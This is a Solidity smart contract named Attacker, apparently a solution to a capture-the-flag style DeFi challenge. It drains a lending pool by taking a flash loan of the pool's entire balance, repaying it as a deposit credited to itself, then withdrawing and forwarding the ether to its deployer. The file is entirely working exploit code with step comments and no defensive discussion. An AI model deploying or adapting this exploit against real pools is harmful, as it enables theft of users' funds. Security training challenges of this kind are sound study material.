// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan (uint256 amount) external
    ;
}

contract Attacker {
    address immutable attacker;
    IPool immutable pool;

    constructor (address _poolAddress) {
        attacker = msg.sender;
        pool = IPool(_poolAddress);
    }

    // 1. Check the balance of the pool
    // 2. Borrow all the balance

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
    }
    // 3. Deposit the borrowed money to the pool

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
    // 4. Withdraw all the money that was 'deposited' earlier
    receive() external payable {
        payable(attacker).transfer(address(this).balance);
    }
}
